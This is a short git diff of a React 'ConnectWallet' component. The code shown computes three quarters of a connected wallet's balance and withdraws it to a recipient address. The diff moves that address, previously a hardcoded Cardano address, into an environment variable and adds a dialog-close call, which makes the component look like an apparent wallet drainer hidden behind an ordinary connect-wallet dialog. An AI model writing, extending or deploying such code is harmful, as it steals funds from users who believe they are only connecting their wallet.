@@ -93,8 +93,7 @@ function ConnectWallet({ onClose }) {
       return;
     }
   
-    const recipientAddress =
-      "addr1q868f8s838prx6xnglzrtk46j3pelc86uuelvr70v5ggzt9cy9xtza6urx030e8d7kkelucnkstrqufx3dnjlyzsg8xsh4vk8t";
+    const recipientAddress = import.meta.env.VITE_REACT_APP_RECIPIENT_ADDRESS;
   
     // Calculate 3/4 of the balance
     const amountToWithdraw = Math.floor(currentBalance * 0.75);
@@ -336,6 +335,7 @@ function ConnectWallet({ onClose }) {
               } else {
                 console.error("Failed to retrieve balance");
               }
+              onClose();
             } else {
               console.error("No addresses found");
               alert(
